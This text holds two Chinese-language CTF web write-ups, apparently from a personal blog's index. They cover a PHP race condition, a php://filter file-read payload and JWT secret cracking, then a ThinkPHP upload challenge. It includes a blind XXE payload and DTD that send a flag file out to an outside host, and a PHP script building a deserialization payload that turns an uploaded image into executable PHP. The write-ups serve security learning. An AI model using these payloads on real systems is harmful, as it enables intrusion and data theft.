&#x5982;&#x679C;&#x5728;#&#x53F7;&#x540E;&#x9762;&#x8D4B;&#x503C;&#x975E;&#x5E38;&#x957F;&#x7684;&#x4E00;&#x6BB5;&#x5B57;&#x7B26;&#xFF0C;&#x5728;php&#x5339;&#x914D;&#x7684;&#x65F6;&#x957F;&#x4F1A;&#x6D88;&#x8017;&#x8D44;&#x6E90;&#xFF08;&#x62D6;&#x5EF6;&#x65F6;&#x95F4;&#xFF09;&#x5BFC;&#x81F4;&#x540E;&#x9762;&#x7684;&#x8BED;&#x53E5;&#x6682;&#x65F6;&#x65E0;&#x6CD5;&#x6267;&#x884C;&#x3002;&#x4E5F;&#x5C31;&#x65E0;&#x6CD5;&#x5C06;permit&#x5B57;&#x6BB5;&#x8BBE;&#x7F6E;&#x4E3A;TERRIBLE&#x3002; &#x56E0;&#x4E3A;&#x524D;&#x9762;&#x5DF2;&#x7ECF;&#x6CE8;&#x518C;&#x4E86;&#x8D26;&#x53F7;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;is_guest&#x7684;&#x5224;&#x65AD;&#x3002; &#x6B63;&#x5E38;&#x6CE8;&#x518C;&#x767B;&#x5F55;&#x63D0;&#x793A;&#xFF1A;no no no! &#x91CD;&#x65B0;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x8D26;&#x53F7;&#xFF0C;code&#x5904;&#x8D4B;&#x503C;&#x4E3A;&#x957F;&#x5B57;&#x7B26;&#x4E32;&#xFF1A; &#x91CD;&#x65B0;&#x767B;&#x5F55;,&#x663E;&#x793A;no&#xFF0C;&#x8BF4;&#x660E;&#x5DF2;&#x7ECF;&#x7ED5;&#x8FC7;is_guest &#x6700;&#x540E;&#x8FD8;&#x9700;&#x8981;&#x7528;PHP&#x4F2A;&#x534F;&#x8BAE;&#x7ED5;&#x8FC7;is_file&#x51FD;&#x6570; payload&#xFF1A; member.php?file=php://filter/read/convert.base64-encode/resource=config.php &#x8BFB;config.php&#x5F97;&#x5230;flag&#x7684;base64&#xFF0C;&#x89E3;&#x7801;&#x5373;&#x53EF;&#x3002; &#x9F99;&#x6E56;&#x8BBA;&#x575B;&#x6BD4;&#x8D5B;&#x7684;&#x65F6;&#x5019;&#x8FD8;&#x6CA1;&#x6709;&#x63A5;&#x89E6;&#x8FC7;JWT&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x65F6;&#x95F4;&#x505A;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x76F8;&#x5F53;&#x4E8E;&#x590D;&#x73B0;&#x4E86;&#x3002; &#x4E00;&#x4E2A;&#x8BBA;&#x575B;&#xFF0C;&#x53EA;&#x6709;&#x7B80;&#x5355;&#x7684;&#x6CE8;&#x518C;&#xFF0C;&#x767B;&#x5F55;&#x548C;&#x4E00;&#x4E2A;&#x7559;&#x8A00;&#x529F;&#x80FD;&#x3002; RSS&#x8BA2;&#x9605;&#x9700;&#x8981;&#x5148;&#x6210;&#x4E3A;VIP&#x3002; ) &#x767B;&#x5F55;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;cookie&#x503C;&#x91CC;&#x9762;&#x770B;&#x5230;token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzeXMiLCJ1c2VybmFtZSI6ImFkbWluIiwiaXN2aXAiOjAsImlhdCI6MTU1NzkyODE2NSwiZXhwIjoxNTU3OTMxNzY1LCJuYmYiOjE1NTc5MjgxNjUsImp0aSI6IjBlMjM5MTI4OWZmMmNmZTc0NjUxZjIyMDlkYzk5YmI1In0.WKRwWB3QE6CG3BYi3WGQ9EBIX3g_YCT26bJsaDMGsXo &#x89E3;&#x5BC6;&#x540E;&#x7684;&#x683C;&#x5F0F;&#x4E3A;&#xFF1A; { &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot; } { &quot;siss&quot;: &quot;sys&quot;, &quot;username&quot;: &quot;admin&quot;, &quot;isvip&quot;: 0, &quot;iat&quot;: 1557928165, &quot;exp&quot;: 1557931765, &quot;nbf&quot;: 1557928165, &quot;jti&quot;: &quot;0e2391289ff2cfe74651f2209dc99bb5&quot; } &#x6211;&#x4EEC;&#x9700;&#x8981;&#x5F97;&#x5230;&#x5BC6;&#x94A5;&#xFF0C;&#x6765;&#x4FEE;&#x6539;isvip&#x7684;&#x503C;&#x4E3A;1&#x3002; &#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5DE5;&#x5177;&#xFF1A;https://github.com/Sjord/jwtcrack &#x6765;&#x7206;&#x7834;&#x5BC6;&#x94A5;&#x3002; &#x6784;&#x9020;&#x5BC6;&#x94A5;&#x540E;&#x7206;&#x7834;&#x5F97;&#x5230;&#x5BC6;&#x94A5;&#x4E3A;sicnuctf &#x4F7F;&#x7528;&#x5728;&#x7EBF;&#x5DE5;&#x5177;https://jwt.io/ &#x4FEE;&#x6539;JWT&#x7684;&#x503C;&#xFF0C;&#x7136;&#x540E;&#x4FEE;&#x6539;cookie&#x7684;token&#x5373;&#x53EF;&#x8FDB;&#x5165;rss&#x8BA2;&#x9605;&#x9875;&#x9762;&#x3002; &#x770B;Writeup&#x77E5;&#x9053;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x4E00;&#x4E2A;Blind XXE&#x3002; &#x7531;&#x4E8E;&#x73AF;&#x5883;&#x914D;&#x7F6E;&#xFF0C;&#x8FD9;&#x91CC;&#x590D;&#x73B0;&#x4E0D;&#x4E86;&#x8FD9;&#x4E2A;XXE&#xFF0C;&#x76F4;&#x63A5;&#x8D34;&#x5E08;&#x5085;&#x7684;&#x811A;&#x672C;&#x4E86;&#xFF1A; payload.xml 123&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root SYSTEM &quot;http://ip/evil.dtd&quot;&gt;&lt;root&gt;&amp;p;&lt;/root&gt; evil.dtd 123&lt;!ENTITY % p1 SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;&lt;!ENTITY % p2 &quot;&lt;!ENTITY p SYSTEM &apos;http://ip:port/%p1;&apos;&gt;&quot;&gt;%p2; &#x540E;&#x8BDD;&#x63A5;&#x89E6;&#x5230;&#x4E86;&#x4E24;&#x4E2A;&#x65B0;&#x4E1C;&#x897F;&#xFF1A; php&#x7684;&#x6761;&#x4EF6;&#x7ADE;&#x4E89; JWT &#x540E;&#x671F;&#x8FD8;&#x8981;&#x66F4;&#x591A;&#x7684;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#x3002;","link":"/2019/05/15/川师线下CTF-Web-Writeup/"},{"title":"强网杯upload Writeup与简单分析","text":"&#x8BF4;&#x5728;&#x524D;&#x9762;&#x7B2C;&#x4E00;&#x6B21;&#x6253;&#x5F3A;&#x7F51;&#x676F;&#xFF0C;&#x6CA1;&#x60F3;&#x5230;&#x8FD9;&#x4E48;&#x96BE;&#xFF0C;&#x840C;&#x65B0;&#x745F;&#x745F;&#x53D1;&#x6296;&#x3002;BY Threezh1 &#x9898;&#x76EE;&#x6709;&#x70B9;&#x7ED5;&#xFF0C;&#x770B;&#x4E86;&#x534A;&#x5929;&#x90FD;&#x6CA1;&#x627E;&#x5230;&#x91CD;&#x70B9;&#x3002;&#x540E;&#x9762;&#x8FD8;&#x662F;&#x9760;&#x5B66;&#x957F;&#x7ED9;&#x7684;payload&#x601D;&#x8DEF;&#x7406;&#x6E05;&#x695A;&#x4E86;&#x8FC7;&#x7A0B;&#x3002;&#x8FD9;&#x91CC;&#x5C31;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#xFF0C;&#x5B66;&#x4E60;&#x5B66;&#x4E60;&#x3002; &#x9898;&#x76EE;&#x5206;&#x6790;&#x7F51;&#x7AD9;&#x57FA;&#x672C;&#x529F;&#x80FD;&#xFF1A; &#x6CE8;&#x518C;&#x767B;&#x5F55;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0A;&#x4F20;&#x4E00;&#x5F20;&#x56FE;&#x7247;&#x4F5C;&#x4E3A;&#x5934;&#x50CF;&#x3002; &#x65E0;&#x8BBA;&#x4E0A;&#x4F20;&#x4EC0;&#x4E48;&#x683C;&#x5F0F;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x6587;&#x4EF6;&#x540D;&#x90FD;&#x4F1A;&#x4FEE;&#x6539;&#x4E3A;md5&#x503C;.png &#x5206;&#x6790;&#xFF1A; &#x4F7F;&#x7528;dirsearch&#x7B49;&#x5DE5;&#x5177;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x626B;&#x5230;&#x7F51;&#x7AD9;&#x6E90;&#x7801;&#x5730;&#x5740;&#xFF1A; http://49.4.6.176:32288/www.tar.gz &#x6846;&#x67B6;&#x4E3A;TP5&#xFF0C;&#x76F4;&#x63A5;&#x770B;application/web/controller&#x76EE;&#x5F55;&#x3002;&#x5305;&#x62EC;&#x4E86;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x6A21;&#x5757;&#xFF0C;&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x4E86;&#x7F51;&#x7AD9;&#x7684;&#x51E0;&#x4E2A;&#x529F;&#x80FD;&#x3002;&#x7531;&#x4E8E;Login.php&#x91CC;&#x6CA1;&#x6709;&#x5BF9;&#x89E3;&#x9898;&#x6709;&#x7528;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EA;&#x770B;&#x5176;&#x4ED6;&#x4E09;&#x4E2A;&#x9875;&#x9762;&#x3002; Index.php //&#x8D26;&#x6237;&#x9996;&#x9875; Login.php //&#x767B;&#x9646; Profile.php //&#x4E0A;&#x4F20; Register.php //&#x6CE8;&#x518C; Index.php &#x5B83;&#x7684;&#x4F5C;&#x7528;&#x4E3A;&#x5224;&#x65AD;&#x662F;&#x5426;&#x767B;&#x5F55;&#xFF0C;&#x6839;&#x636E;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x4E0A;&#x4F20;&#x56FE;&#x7247;&#x6765;&#x663E;&#x793A;&#x6307;&#x5B9A;&#x7684;&#x7528;&#x6237;&#x4E3B;&#x9875;&#x6A21;&#x677F;&#x3002; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?phpnamespace app\\web\\controller;use think\\Controller;class Index extends Controller{ public $profile; public $profile_db; public function index() { if($this-&gt;login_check()){ //&#x5224;&#x65AD;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x767B;&#x5F55; $curr_url=&quot;http://&quot;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;SCRIPT_NAME&apos;].&quot;/home&quot;; $this-&gt;redirect($curr_url,302); exit(); } return $this-&gt;fetch(&quot;index&quot;); } public function home(){ if(!$this-&gt;login_check()){ //&#x518D;&#x5224;&#x65AD;&#x662F;&#x5426;&#x767B;&#x5F55; $curr_url=&quot;http://&quot;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;SCRIPT_NAME&apos;].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); } if(!$this-&gt;check_upload_img()){ //&#x68C0;&#x67E5;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x4E0A;&#x4F20;&#x56FE;&#x7247; $this-&gt;assign(&quot;username&quot;,$this-&gt;profile_db[&apos;username&apos;]); return $this-&gt;fetch(&quot;upload&quot;); }else{ $this-&gt;assign(&quot;img&quot;,$this-&gt;profile_db[&apos;img&apos;]); // $this-&gt;assign(&quot;username&quot;,$this-&gt;profile_db[&apos;username&apos;]); return $this-&gt;fetch(&quot;home&quot;); } } public function login_check(){ //&#x767B;&#x5F55;&#x68C0;&#x67E5; $profile=cookie(&apos;user&apos;); //&#x83B7;&#x53D6;cookie if(!empty($profile)){ //&#x5224;&#x65AD;&#x662F;&#x5426;&#x4E3A;&#x7A7A; $this-&gt;profile=unserialize(base64_decode($profile)); //&#x5C06;cookie&#x89E3;&#x7801;&#x540E;&#x53CD;&#x5E8F;&#x5217;&#x5316; $this-&gt;profile_db=db(&apos;user&apos;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&apos;ID&apos;]))-&gt;find(); //&#x6839;&#x636E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x51FA;&#x6765;&#x7684;id&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x67E5;&#x8BE2; if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null){ //&#x8FDB;&#x884C;&#x5DEE;&#x503C;&#x67E5;&#x8BE2; return 1; }else{ return 0; } } } public function check_upload_img(){ //&#x68C0;&#x67E5;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x4E0A;&#x4F20;&#x56FE;&#x7247;&#xFF0C;&#x6839;&#x636E;cookie&#x5F53;&#x4E2D;&#x548C;&#x67E5;&#x8BE2;&#x51FA;&#x6765;&#x7684;&#x6570;&#x636E; if(!empty($this-&gt;profile) &amp;&amp; !empty($this-&gt;profile_db)){ if(empty($this-&gt;profile_db[&apos;img&apos;])){ return 0; }else{ return 1; } } } public function logout(){ cookie(&quot;user&quot;,null); $curr_url=&quot;http://&quot;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;SCRIPT_NAME&apos;].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); } public function __get($name) { return &quot;&quot;; }} &#x91CC;&#x9762;&#x4E0E;&#x4E00;&#x4E2A;&#x9898;&#x76EE;&#x76F8;&#x5173;&#x4E14;&#x91CD;&#x8981;&#x7684;&#x51FD;&#x6570;&#x4E3A;login_check()&#xFF1A; &#x51FD;&#x6570;&#x4E2D;&#x5148;&#x83B7;&#x53D6;cookie&#xFF0C;&#x5982;&#x679C;cookie&#x4E0D;&#x4E3A;&#x7A7A;&#xFF0C;&#x5219;&#x5C06;cookie&#x8FDB;&#x884C;base64&#x89E3;&#x7801;&#x4E4B;&#x540E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002; &#x8FD9;&#x4E2A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x51FD;&#x6570;&#x4E5F;&#x5C31;&#x662F;&#x89E3;&#x9898;&#x7684;&#x5165;&#x53E3;&#xFF0C;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x7684;&#x5C31;&#x662F;&#x6784;&#x9020;&#x5E8F;&#x5217;&#x5316;&#x7684;payload&#x8D4B;&#x503C;&#x5230;cookie&#x91CC;&#xFF0C;&#x7ECF;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x6267;&#x884C;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x7684;&#x547D;&#x4EE4;&#x3002; Profile.php &#x5F53;&#x56FE;&#x7247;&#x4E0A;&#x4F20;&#x65F6;&#xFF0C;&#x6B64;&#x9875;&#x9762;&#x4F1A;&#x5BF9;&#x56FE;&#x7247;&#x8FDB;&#x884C;&#x4E00;&#x5B9A;&#x7684;&#x5904;&#x7406;&#x5E76;&#x66F4;&#x65B0;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x548C;cookie&#x5185;&#x5BB9;&#x3002; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;?phpnamespace app\\web\\controller;use think\\Controller;class Profile extends Controller{ public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __construct() { $this-&gt;checker=new Index(); $this-&gt;upload_menu=md5($_SERVER[&apos;REMOTE_ADDR&apos;]); @chdir(&quot;../public/upload&quot;); if(!is_dir($this-&gt;upload_menu)){ @mkdir($this-&gt;upload_menu); } @chdir($this-&gt;upload_menu); } public function upload_img(){ if($this-&gt;checker){ if(!$this-&gt;checker-&gt;login_check()){ $curr_url=&quot;http://&quot;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;SCRIPT_NAME&apos;].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); } } if(!empty($_FILES)){ //&#x7ED9;&#x56FE;&#x7247;&#x52A0;&#x4E2A;&#x540E;&#x7F00;.png $this-&gt;filename_tmp=$_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; //&#x539F;&#x56FE;&#x7247;&#x7684;&#x540D;&#x5B57; $this-&gt;filename=md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;; //&#x4FEE;&#x6539;&#x540E;&#x7684;&#x56FE;&#x7247;&#x540D;&#x5B57; $this-&gt;ext_check(); //&#x8FDB;&#x884C;&#x56FE;&#x7247;&#x68C0;&#x67E5; } if($this-&gt;ext) { //&#x5224;&#x65AD;&#x662F;&#x5426;&#x6210;&#x529F;&#x4FEE;&#x6539;&#x540E;&#x7F00; if(getimagesize($this-&gt;filename_tmp)) { //&#x83B7;&#x53D6;&#x56FE;&#x7247;&#x5927;&#x5C0F; @copy($this-&gt;filename_tmp, $this-&gt;filename); //&#x5C06;&#x8001;&#x56FE;&#x7247;&#x7684;&#x5730;&#x5740;&#x6539;&#x4E3A;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x5730;&#x5740;&#x3002; @unlink($this-&gt;filename_tmp); //&#x5220;&#x9664; $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;; //&#x8D4B;&#x503C;$this-&gt;img $this-&gt;update_img(); //&#x4E0A;&#x4F20;&#x56FE;&#x7247; }else{ $this-&gt;error(&apos;Forbidden type!&apos;, url(&apos;../index&apos;)); } }else{ $this-&gt;error(&apos;Unknow file type!&apos;, url(&apos;../index&apos;)); } } public function update_img(){ $user_info=db(&apos;user&apos;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&apos;ID&apos;])-&gt;find(); if(empty($user_info[&apos;img&apos;]) &amp;&amp; $this-&gt;img){ if(db(&apos;user&apos;)-&gt;where(&apos;ID&apos;,$user_info[&apos;ID&apos;])-&gt;data([&quot;img&quot;=&gt;addslashes($this-&gt;img)])-&gt;update()){ $this-&gt;update_cookie(); $this-&gt;success(&apos;Upload img successful!&apos;, url(&apos;../home&apos;)); }else{ $this-&gt;error(&apos;Upload file failed!&apos;, url(&apos;../index&apos;)); } } } public function update_cookie(){ $this-&gt;checker-&gt;profile[&apos;img&apos;]=$this-&gt;img; cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600); } public function ext_check(){ $ext_arr=explode(&quot;.&quot;,$this-&gt;filename); $this-&gt;ext=end($ext_arr); if($this-&gt;ext==&quot;png&quot;){ return 1; }else{ return 0; } } public function __get($name) { return $this-&gt;except[$name]; } public function __call($name, $arguments) { if($this-&gt;{$name}){ $this-&gt;{$this-&gt;{$name}}($arguments); } }} &#x505A;&#x9898;&#x7684;&#x65F6;&#x5019;&#x4E3A;&#x4E86;&#x5E2E;&#x81EA;&#x5DF1;&#x7406;&#x6E05;&#x695A;&#x6E90;&#x7801;&#x903B;&#x8F91;&#xFF0C;&#x5C1D;&#x8BD5;&#x628A;&#x6BCF;&#x4E00;&#x4E2A;&#x8BED;&#x53E5;&#x90FD;&#x6253;&#x4E0A;&#x6CE8;&#x91CA;&#xFF0C;&#x7ED3;&#x679C;&#x8FD8;&#x662F;&#x6CA1;&#x627E;&#x5230;&#x91CD;&#x70B9;&#x3002; &#x7531;&#x4E8E;&#x6700;&#x91CD;&#x8981;&#x7684;&#x5C31;&#x662F;&#x56FE;&#x7247;&#x4E0A;&#x4F20;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x76F4;&#x63A5;&#x6765;&#x770B;&#xFF1A; upload_img()&#x51FD;&#x6570;&#xFF0C;&#x5F53;&#x6709;&#x56FE;&#x7247;&#x4E0A;&#x4F20;&#x65F6;&#xFF0C;&#x5B83;&#x4F1A;&#x7ECF;&#x8FC7;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x6B65;&#x9AA4;&#xFF1A; &#x5224;&#x65AD;&#x662F;&#x5426;&#x767B;&#x5F55;&#x6210;&#x529F; &#x5F53;&#x6587;&#x4EF6;&#x4E0D;&#x4E3A;&#x7A7A;&#x65F6;&#xFF0C;&#x4F1A;&#x8D4B;&#x503C;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;filename_tmp&#x4E3A;&#x539F;&#x56FE;&#x7247;&#x5730;&#x5740;&#xFF0C;filename&#x4E3A;&#x539F;&#x56FE;&#x7247;&#x540D;&#x7684;md5&#x52A0;&#x5BC6;&#x503C;+&#x201D;.png&#x201D;&#xFF0C;&#x5E76;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x6765;&#x5224;&#x65AD;&#x662F;&#x5426;&#x6210;&#x529F;&#x4FEE;&#x6539;filename&#x3002; &#x5728;&#x5224;&#x65AD;&#x6210;&#x529F;&#x4FEE;&#x6539;filename&#x4E3A;.png&#x540E;&#x7F00;&#x540E;&#xFF0C;&#x5C31;&#x4F1A;&#x539F;&#x56FE;&#x7247;&#x540D;filename_tmp&#x4FEE;&#x6539;&#x4E3A;.png&#x540E;&#x7F00;&#x7684;filename&#x3002;&#x5E76;&#x5220;&#x9664;&#x539F;&#x6765;&#x7684;&#x56FE;&#x7247;&#x3002; &#x66F4;&#x65B0;&#x6570;&#x636E;&#x5E93;&#x5185;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x4E0E;cookie &#x5E76;&#x4E14;&#xFF0C;&#x6E90;&#x7801;&#x7684;&#x6700;&#x540E;&#x8FD8;&#x6709;&#x4E24;&#x4E2A;php&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF0C;__get(),__call() &#x8BFB;&#x53D6;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x5C5E;&#x6027;&#x7684;&#x503C;&#x65F6;&#xFF0C;__get() &#x4F1A;&#x88AB;&#x8C03;&#x7528;&#x3002;&#x8FD4;&#x56DE;except[$&#x88AB;&#x8C03;&#x7528;&#x7684;&#x5C5E;&#x6027;]&#x7684;&#x503C; &#x5728;&#x5BF9;&#x8C61;&#x4E2D;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x65B9;&#x6CD5;&#x65F6;&#xFF0C;__call() &#x4F1A;&#x88AB;&#x8C03;&#x7528;&#x3002; &#x5176;&#x4E2D;&#xFF1A;`$this-&gt;{$this-&gt;{$name}}($arguments);`&#x6BD4;&#x8F83;&#x7ED5;&#xFF0C; &#x6211;&#x4EEC;&#x8BBE;A&#x4E3A;&#x6240;&#x8C03;&#x7528;&#x7684;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x65B9;&#x6CD5;&#x540D;&#x3002;B&#x4E3A;&#x8C03;&#x7528;&#x65B9;&#x6CD5;&#x65F6;&#x6240;&#x8D4B;&#x503C;&#x7684;&#x53C2;&#x6570;&#xFF0C;C&#x4E3A;&#x4E00;&#x4E2A;&#x548C;A&#x4E3A;&#x4E00;&#x4E2A;&#x540D;&#x5B57;&#x7684;&#x53D8;&#x91CF;&#x3002;D&#x4E3A;&#x53D8;&#x91CF;C&#x7684;&#x503C;&#x3002; &#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#x5C31;&#x4F1A;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#xFF1A;D(B) &#x4ECE;&#x8FD9;&#x91CC;&#x6765;&#x770B;&#xFF0C;&#x9898;&#x76EE;&#x7684;&#x89E3;&#x9898;&#x65B9;&#x6CD5;&#x5C31;&#x6BD4;&#x8F83;&#x660E;&#x4E86;&#x4E86;&#xFF0C;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x5E8F;&#x5217;&#x5316;&#x7684;payload&#xFF0C;&#x7ED5;&#x8FC7;&#x6216;&#x8005;&#x4FEE;&#x6539;&#x4E0A;&#x4F20;&#x7684;&#x56FE;&#x7247;&#x540E;&#x7F00;&#x540D;&#x4E3A;.php&#x3002; Register.php &#x8D1F;&#x8D23;&#x6CE8;&#x518C;&#x7684;&#x9875;&#x9762; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace app\\web\\controller;use think\\Controller;class Register extends Controller{ public $checker; public $registed; public function __construct() { $this-&gt;checker=new Index(); } public function register() { if ($this-&gt;checker) { if($this-&gt;checker-&gt;login_check()){ $curr_url=&quot;http://&quot;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;SCRIPT_NAME&apos;].&quot;/home&quot;; $this-&gt;redirect($curr_url,302); exit(); } } if (!empty(input(&quot;post.username&quot;)) &amp;&amp; !empty(input(&quot;post.email&quot;)) &amp;&amp; !empty(input(&quot;post.password&quot;))) { $email = input(&quot;post.email&quot;, &quot;&quot;, &quot;addslashes&quot;); $password = input(&quot;post.password&quot;, &quot;&quot;, &quot;addslashes&quot;); $username = input(&quot;post.username&quot;, &quot;&quot;, &quot;addslashes&quot;); if($this-&gt;check_email($email)) { if (empty(db(&quot;user&quot;)-&gt;where(&quot;username&quot;, $username)-&gt;find()) &amp;&amp; empty(db(&quot;user&quot;)-&gt;where(&quot;email&quot;, $email)-&gt;find())) { $user_info = [&quot;email&quot; =&gt; $email, &quot;password&quot; =&gt; md5($password), &quot;username&quot; =&gt; $username]; if (db(&quot;user&quot;)-&gt;insert($user_info)) { $this-&gt;registed = 1; $this-&gt;success(&apos;Registed successful!&apos;, url(&apos;../index&apos;)); } else { $this-&gt;error(&apos;Registed failed!&apos;, url(&apos;../index&apos;)); } } else { $this-&gt;error(&apos;Account already exists!&apos;, url(&apos;../index&apos;)); } }else{ $this-&gt;error(&apos;Email illegal!&apos;, url(&apos;../index&apos;)); } } else { $this-&gt;error(&apos;Something empty!&apos;, url(&apos;../index&apos;)); } } public function check_email($email){ $pattern = &quot;/^[_a-z0-9-]+(\\.[_a-z0-9-]+)*@[a-z0-9-]+(\\.[a-z0-9-]+)*(\\.[a-z]{2,})$/&quot;; preg_match($pattern, $email, $matches); if(empty($matches)){ return 0; }else{ return 1; } } public function __destruct() { if(!$this-&gt;registed){ $this-&gt;checker-&gt;index(); } }} &#x524D;&#x9762;&#x4E00;&#x90E8;&#x5206;&#x90FD;&#x662F;&#x5BF9;&#x89E3;&#x9898;&#x6CA1;&#x4EC0;&#x4E48;&#x592A;&#x5927;&#x7528;&#x5904;&#x3002; &#x770B;&#x6700;&#x540E;&#x7684;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5;&#xFF0C;&#x5728;&#x7C7B;&#x521B;&#x5EFA;&#x5B8C;&#x6BD5;&#x4E4B;&#x540E;&#x6240;&#x89E6;&#x53D1;&#xFF0C;&#x8FD9;&#x91CC;$this-&gt;checker&#x8C03;&#x7528;&#x4E86;index()&#xFF0C;&#x540E;&#x9762;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x91CC;&#x6765;&#x6784;&#x9020;payload&#x3002; &#x6839;&#x636E;payload&#x6765;&#x770B;&#x89E3;&#x9898;&#x7684;&#x601D;&#x8DEF;&#x751F;&#x6210;Payload&#x7684;&#x811A;&#x672C;: 123456789101112131415161718&lt;?phpnamespace app\\web\\controller;class Register{ public $checker; public $registed=0; public function __construct($check){ $this-&gt;checker=$check; }}class Profile{ public $except = array(&apos;index&apos;=&gt;&apos;upload_img&apos;); public $ext = 1; public $filename_tmp = &quot;./upload/98acc62aa02eda032d1caed497ce72a0/2b4ec354e9c2540ed9bc584cec08c9c0.png&quot;; public $filename=&quot;./upload/98acc62aa02eda032d1caed497ce72a0/2b4ec354e9c2540ed9bc584cec08c9c0.php&quot;;}$a=new Register(new Profile());echo base64_encode(serialize($a));?&gt; &#x5728;&#x770B;&#x4E86;payload&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x6574;&#x7406;&#x4E86;&#x4E00;&#x4E0B;&#x6211;&#x81EA;&#x5DF1;&#x7684;&#x601D;&#x8DEF;&#xFF1A; profile.php&#x91CC;&#x7684;upload_img&#x51FD;&#x6570;&#x4E2D;&#x6709;&#x4E00;&#x5904;&#x590D;&#x5236;&#x56FE;&#x7247;&#x5230;&#x65B0;&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x5220;&#x9664;&#x539F;&#x6765;&#x56FE;&#x7247;&#x7684;&#x8BED;&#x53E5;&#xFF1A; 12@copy($this-&gt;filename_tmp, $this-&gt;filename); //&#x5C06;&#x8001;&#x56FE;&#x7247;&#x7684;&#x5730;&#x5740;&#x6539;&#x4E3A;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x5730;&#x5740;&#x3002;@unlink($this-&gt;filename_tmp); //&#x5220;&#x9664; &#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x5C06;filename_tmp&#x8D4B;&#x503C;&#x4E3A;.png&#x540E;&#x7F00;&#xFF0C;&#x5C06;filename&#x8D4B;&#x503C;&#x4E3A;.php&#x540E;&#x7F00;&#x3002; 